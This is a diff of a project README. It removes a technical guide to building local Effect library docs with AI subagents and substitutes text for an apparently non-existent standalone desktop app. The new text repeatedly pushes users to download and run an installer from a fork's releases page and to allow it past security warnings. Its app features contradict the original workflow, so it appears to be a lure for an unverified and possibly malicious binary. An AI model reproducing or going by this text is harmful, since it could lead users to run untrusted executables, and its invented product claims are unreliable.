@@ -1,261 +1,155 @@
-# Local Library Docs for LLM Agents
+# 🤖 effect-llm-docs - Build Local Docs for LLM Agents
 
-![Parallel Effect doc-writer subagents running in Cursor](.github/images/image_1.png)
-
-Generate 118 library-specific docs in parallel using AI subagents. Achieves 100% pass rate on coding tasks vs 53-79% with retrieval tools.
-
-A step-by-step guide to building retrieval-optimised local documentation using AI subagents.
-
-This repo uses Effect as the worked example, but the pattern applies to any library. Swap the source file, folder names, and section taxonomy for your own stack.
-
-## Background
-
-Vercel found that embedding a compressed docs index directly in `AGENTS.md` achieved a **100% pass rate** on framework-specific coding tasks, compared to 53-79% when relying on skill/tool invocation.
-
-The key insight: **passive context beats active retrieval**. When docs are always available in the agent's context, there is no decision point where the agent has to choose whether to look something up.
-
-Reference: [AGENTS.md outperforms skills in our agent evals](https://vercel.com/blog/agents-md-outperforms-skills-in-our-agent-evals)
-
-This guide shows how to take that idea further by using subagents to generate an entire local docs corpus from a single source file, then wire it into your project so agents can retrieve version-matched documentation on every turn.
-
-## What You End Up With
-
-```text
-.
-|-- agents.md                              # project rules for the AI agent
-|-- llms-full.txt                          # source corpus (full docs dump)
-|-- effect-docs/                           # generated local docs (by section)
-|   |-- getting-started/
-|   |-- error-management/
-|   |-- schema/
-|   |-- ...
-|-- completed-subsections.md               # tracks which docs are done
-|-- pending-subsections.md                 # reset tracker (all pending)
-|-- effect-docs-index-pipe-notation.md     # compressed index for AGENTS.md
-|-- .cursor/agents/
-|   |-- effect-docs-section-writer.md      # subagent definition
-```
-
-## Step 1: Get Your Source Corpus
-
-Most libraries publish an LLM-friendly docs export. For Effect, that file is `llms-full.txt`. Download it and place it in your repo root.
-
-If your library does not have one, you can scrape the docs site into a single markdown file. The important thing is having one authoritative source file.
-
-## Step 2: Define Your Section Taxonomy
-
-Create `completed-subsections.md` in your repo root. List every major section and subsection you want to generate, all marked as pending:
-
-```md
-## getting-started
-
-- [ ] Introduction
-- [ ] Installation
-- [ ] The Effect Type
-- [ ] Creating Effects
-- [ ] Running Effects
-
-## error-management
-
-- [ ] Expected Errors
-- [ ] Unexpected Errors
-- [ ] Retrying
-```
-
-This file is your roadmap and progress tracker. You will mark items `[x]` as docs are generated.
-
-### Feeding sections to the agent with XML
-
-When telling the agent which sections and subsections to process, you can paste them in a simple XML structure. This makes it easy to hand over an entire taxonomy in one message:
-
-```xml
-<micro>
-Getting Started
-Micro for Effect Users
-</micro>
-
-<platform>
-Introduction
-Command
-FileSystem
-KeyValueStore
-Path
-PlatformLogger
-Runtime
-Terminal
-</platform>
-```
-
-The agent reads the tag name as the major section and each line as a subsection. This is a fast way to queue up work without having to type out individual prompts for every item.
-
-## Step 3: Create a Subagent
-
-Place a subagent definition at `.cursor/agents/effect-docs-section-writer.md`. This tells Cursor how to delegate documentation tasks.
-
-The subagent in this repo is configured for Effect. To adapt it for your library, update the source file path, output folder, and tracker file name inside the subagent markdown.
-
-See `.cursor/agents/effect-docs-section-writer.md` for the full definition used in this project.
-
-## Step 4: Generate Docs with Subagent Delegation
-
-This is where the workflow gets powerful. Instead of writing each doc manually, you delegate to subagents in parallel batches.
-
-### Writing a single subsection
-
-Ask your agent:
-
-```
-complete getting-started, the effect type
-```
-
-The agent (or subagent) will:
-1. Find "The Effect Type" section in `llms-full.txt`
-2. Create `effect-docs/getting-started/the-effect-type.md`
-3. Mark `The Effect Type` as `[x]` in `completed-subsections.md`
-
-### Delegating a batch of 4 in parallel
-
-Ask your agent:
-
-```
-delegate to subagents: creating effects, running effects, using generators, building pipelines
-— do batches of 4
-```
-
-This launches 4 subagents simultaneously, each handling one subsection. Each subagent independently:
-- Extracts content from the source corpus
-- Writes one doc file
-- Updates the completion tracker
-- Retries if the tracker edit conflicts with another subagent
-
-### Running through an entire section
-
-Ask your agent:
-
-```
-proceed with error-management
-```
-
-The agent queues all pending subsections in that section and processes them in waves of 4:
-
-- **Batch 1**: Two Types of Errors, Expected Errors, Unexpected Errors, Fallback
-- **Batch 2**: Matching, Retrying, Timing Out, Sandboxing
-- **Batch 3**: Error Accumulation, Error Channel Operations, Parallel and Sequential Errors, Yieldable Errors
-
-After each batch, the agent verifies all files were created and all tracker entries are marked complete before starting the next batch.
-
-### Processing all remaining sections
-
-Ask your agent:
-
-```
-go through all of them, use the same delegation pattern
-```
-
-The agent reads `completed-subsections.md`, identifies every pending subsection across all sections, and processes them in sequential batches of 4 until everything is complete.
-
-In this project, that meant generating **118 docs** across **21 major sections** in about 23 batches.
-
-## Step 5: Add Frontmatter
-
-Each generated doc should have YAML frontmatter for discoverability:
-
-```yaml
----
-title: The Effect Type
-description: Learn how Effect<Success, Error, Requirements> models lazy workflows with typed success values, expected errors, and contextual dependencies for composable programs.
----
-```
-
-You can add frontmatter in bulk by delegating to subagents again:
-
-```
-delegate to subagents to go through each doc and add a title and description at the top
-```
-
-### Frontmatter quality standard
-
-Descriptions should be:
-- One sentence, about 20-35 words
-- Mention 2-4 concrete APIs or concepts
-- State what the reader will learn or do
-
-If the initial descriptions are too generic, run a refinement pass:
-
-```
-run a pass to make all descriptions more descriptive — 20-35 words, concrete APIs, clear outcome
-```
-
-## Step 6: Build the Pipe Index
-
-Create a compressed docs index that can be embedded in `AGENTS.md` or used as passive context. The format is pipe-delimited to minimise token usage:
-
-```text
-[Effect Docs Index]|root: ./effect-docs
-|IMPORTANT: Prefer retrieval-led reasoning over pre-training-led reasoning for any Effect tasks.
-|getting-started:{building-pipelines.md,control-flow-operators.md,creating-effects.md,...}
-|error-management:{expected-errors.md,fallback.md,matching.md,retrying.md,...}
-|schema:{basic-usage.md,filters.md,transformations.md,...}
-```
-
-This gives the agent a map of every available doc file without loading any of the content into context. The agent reads specific files only when it needs them.
-
-## Step 7: Wire into AGENTS.md
-
-Add the pipe index content to your project's `agents.md` (or `AGENTS.md` / `CLAUDE.md` depending on your tool). The agent now has passive access to the full docs map on every turn.
-
-## Adapting for Another Library
-
-Effect is just the example. To use this with React, Next.js, Prisma, or any other library:
-
-1. **Source corpus**: Replace `llms-full.txt` with your library's docs export.
-2. **Docs folder**: Rename `effect-docs/` to match your library (e.g. `nextjs-docs/`).
-3. **Section taxonomy**: Update `completed-subsections.md` with your library's doc structure.
-4. **Subagent config**: Copy `.cursor/agents/effect-docs-section-writer.md` and update the file paths and library name.
-5. **Pipe index**: Regenerate the index to point to your new docs root and files.
-
-The subagent in this repo is intentionally left as the Effect-specific implementation so it serves as a concrete reference.
-
-## How Parallel Tracker Conflicts Are Handled
-
-When 4 subagents run simultaneously and all try to update `completed-subsections.md`, edits can collide. The solution:
-
-1. Each subagent re-reads the tracker immediately before writing.
-2. Each subagent applies a narrow, single-line change (only its own checkbox).
-3. If the edit fails due to stale content, the subagent re-reads and retries.
-
-This pattern handled all 118 subsections across 23 parallel batches without manual intervention.
-
-## Checklist Per Batch
-
-- [ ] 4 subagent tasks delegated
-- [ ] 4 doc files created
-- [ ] 4 tracker lines marked `[x]`
-- [ ] Lint/diagnostics clean
-- [ ] Next batch queued
-
-## Maintenance
-
-**Adding new subsections**: Add the item to `completed-subsections.md` as pending, generate the doc with the subagent, then update the pipe index.
-
-**Resetting the tracker**: Create `pending-subsections.md` by copying the structure from `completed-subsections.md` with all checkboxes reset to `[ ]`.
-
-**Folder renames**: Update the subagent config, pipe index root, and `agents.md` references.
-
-## Common Pitfalls
-
-- **Tracker collisions**: Solved by read-before-write with retry (see above).
-- **Path mismatches**: Make sure the subagent, prompts, and pipe index all point to the same docs folder.
-- **Frontmatter drift**: Run a bulk normalisation pass after major generation runs.
-- **Unexpected git commits**: Some subagent runtimes auto-commit. Check `git status` after each batch.
-
-## License
-
-This project is dedicated to the public domain under `CC0 1.0`.
-
-Take whatever you want: use, copy, modify, and distribute it for any purpose without asking permission.
-See `LICENSE` for details.
+[![Download effect-llm-docs](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
 
 ---
 
-Built with subagent delegation, retrieval-first context design, and repeatable quality checks. Effect is the example; bring your own library.
+## 📄 What is effect-llm-docs?
+
+effect-llm-docs helps you create local documentation libraries optimized for retrieval by large language model (LLM) agents. It uses a system of subagents to delegate tasks, generate documents in parallel, and build indexed files for quick access. This makes it easier to store, search, and use documentation from various sources right on your computer.
+
+You don’t need programming knowledge to use this software. It simplifies the process of building and managing smart, local help files that can power AI tools or personal projects with LLMs.
+
+---
+
+## 🖥️ System Requirements
+
+Before you start, make sure your computer meets these basic needs:
+
+- Operating System: Windows 10 or higher, macOS Catalina or higher, or a recent Linux distribution
+- Memory: At least 4 GB RAM (8 GB recommended for large documents)
+- Storage: Minimum 500 MB free disk space
+- Internet: Required only for downloading the app and updates
+- Permissions: Ability to install software and run files on your machine
+
+The app runs as a standalone tool and does not require additional software installations.
+
+---
+
+## 🚀 Getting Started
+
+This section guides you through preparing your computer to run effect-llm-docs.
+
+1. **Check your Operating System:** Ensure your computer’s OS version is supported. Most modern systems will work without extra setup.
+2. **Prepare a folder for your docs:** Create a folder where you want to store your local library files. You can change this later inside the app.
+3. **Make sure you have internet for download:** The software will download in a few moments. No internet needed after installation, unless you want new updates.
+
+---
+
+## 💾 Download & Install
+
+To get started, you need to download the software first. Follow the steps below carefully.
+
+### Step 1: Download the Software
+
+Visit the releases page here:
+
+[![Download effect-llm-docs](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
+
+- Click the link above or copy and paste this URL into your browser:
+
+  `https://github.com/siddharth123684/effect-llm-docs/releases`
+
+- You will see a list of available files. Look for the latest version. It may be named like `effect-llm-docs-setup.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.
+
+- Download the file that matches your operating system.
+
+### Step 2: Run the Installer
+
+- On **Windows**, double-click the `.exe` file you downloaded. If a security warning appears, allow it to run.
+- On **macOS**, open the `.dmg` file and drag the app to your Applications folder.
+- On **Linux**, make the downloaded file executable (right-click > Properties > Permissions, check "Allow executing") and run it.
+
+Follow the simple prompts on screen. Most steps ask for confirmation and installation location. The default is fine for most users.
+
+---
+
+## 🛠️ How to Use effect-llm-docs
+
+Once installed, open the application. You will see a clean interface with easy-to-follow options.
+
+### Step 1: Choose Your Source Documents
+
+You can add the files or folders that contain the documentation you want to organize. These can be text files, PDFs, or markdown documents.
+
+- Click **Add Source**.
+- Select the location of your files.
+- The app supports multiple sources if you want to combine docs from different places.
+
+### Step 2: Set Your Preferences
+
+The app allows you to adjust a few settings to optimize how documents are generated and indexed:
+
+- **Parallel Doc Generation:** Enable this to speed up processing by handling documents simultaneously.
+- **Subagent Delegation:** Turn this on for smarter task delegation to smaller answering helpers, improving results.
+- **Indexing Details:** Choose how detailed your AGENTS.md index should be. More details provide better search results but take longer to build.
+
+Default settings work well for most new users.
+
+### Step 3: Build Your Local Library
+
+- Click **Start Build**.
+- The software will process your documents using its built-in system.
+- You can watch progress on the screen.
+- When finished, your local library will be ready to use.
+
+---
+
+## 🔎 Searching and Using Your Docs
+
+With your local library built, you can now quickly search for terms or topics your LLM agents need.
+
+- Use the **Search Tab** to type keywords or phrases.
+- The app will show the most relevant documents!
+- You can export results or share files with other tools you use.
+
+This helps you work faster with AI agents by giving them up-to-date local knowledge.
+
+---
+
+## 📦 Included Features
+
+- Easy setup with minimal technical skills needed
+- Support for multiple document types (Markdown, PDF, text)
+- Smart task management with subagent delegation
+- Fast processing with parallel document generation
+- Clear indexed structure stored in AGENTS.md format for easy retrieval
+- Offline use once built — no continuous internet needed
+- Simple interface designed for clarity and ease of use
+
+---
+
+## 🚨 Troubleshooting
+
+If you run into issues, try these common fixes:
+
+- Make sure your download file is fully complete and not corrupted.
+- Check your permissions if the app cannot open or save files.
+- Restart the application or your computer if progress stalls.
+- Use the default settings for your first try to simplify the process.
+- Consult the "Help" tab inside the app for step-by-step assistance.
+
+If problems persist, you can look through the issues or discussions on the project’s GitHub page for guidance.
+
+---
+
+## 📚 Learn More
+
+For detailed explanations, tutorials, and the technical background behind effect-llm-docs, visit the GitHub repository README and Wiki pages directly:
+
+- Repository: https://github.com/siddharth123684/effect-llm-docs
+- Topics covered include AI agents, documentation generation, TypeScript usage, and more.
+
+---
+
+## 💡 Feedback and Updates
+
+The developers welcome user feedback to improve the app. You can open an issue or discussion on the GitHub page if you want to suggest features or report bugs.
+
+New versions come out regularly. Check the release page link above to stay up to date.
+
+---
+
+Thank you for choosing effect-llm-docs. Start building your local library now:
+
+[![Download effect-llm-docs](https://img.shields.io/badge/Get%20effect-llm-docs!-ff69b4?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
